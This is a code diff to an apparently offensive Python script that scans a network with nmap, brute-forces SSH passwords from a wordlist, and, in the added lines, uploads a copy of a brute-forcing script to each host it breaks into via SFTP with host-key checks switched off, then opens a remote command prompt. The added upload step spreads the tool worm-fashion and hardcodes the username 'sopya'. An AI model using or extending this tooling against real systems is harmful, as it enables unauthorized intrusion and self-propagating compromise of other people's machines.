@@ -13,6 +13,8 @@ import nmap
 from pexpect import pxssh
 import time
 import sys
+import os
+import pysftp as sftp
 
 
 ## Scan network for avaliable hosts and open ports
@@ -77,6 +79,27 @@ def get_input(msg):
     return sys.stdin.readline()
 
 
+def send_file(host, user, password):
+
+    print("Sending file on Host: %s Username: %s Password: %s" %(host,user,password))
+
+    try:
+        cnopts = sftp.CnOpts()
+        cnopts.hostkeys = None
+        #usr = str(user)
+        s = sftp.Connection(host=host, username='sopya', password=password, cnopts=cnopts)
+
+        print("Connection done... sending file!!")      
+ 
+        remotepath= '/home/sopya/Brute.py'
+        localpath= os.getcwd()+'/'+'myBrute.py'
+
+        s.put(localpath, remotepath)
+        s.close()
+
+    except Exception, e:
+        print(e)
+
 
 def Main():
 
@@ -84,8 +107,9 @@ def Main():
     dt = sys.argv[2]
     nmap_scan(network)
 
+    print("--------------------------------------------------------")
     host = get_input("Select IP address you want as an agent: ")
-    print("You have selected agent as %s " %host)
+    #print("You have selected agent as %s " %host)
 
     user = get_input("Enter the username of the agent: ")
 
@@ -93,9 +117,10 @@ def Main():
         with open(dt, 'r') as infile:
             for line in infile:
                 password = line.strip('\r\n')
-                print 'Testing -> ' + str(password)
+                print 'Testing password -> ' + str(password)
                 conn = connect(host, user, password)
                 if conn:
+                    send_file(host, user, password)
                     print '[SSH connected, Issue commands Q or q for quiting!]'
                     command = raw_input('>')
                     while command.lower != 'q':
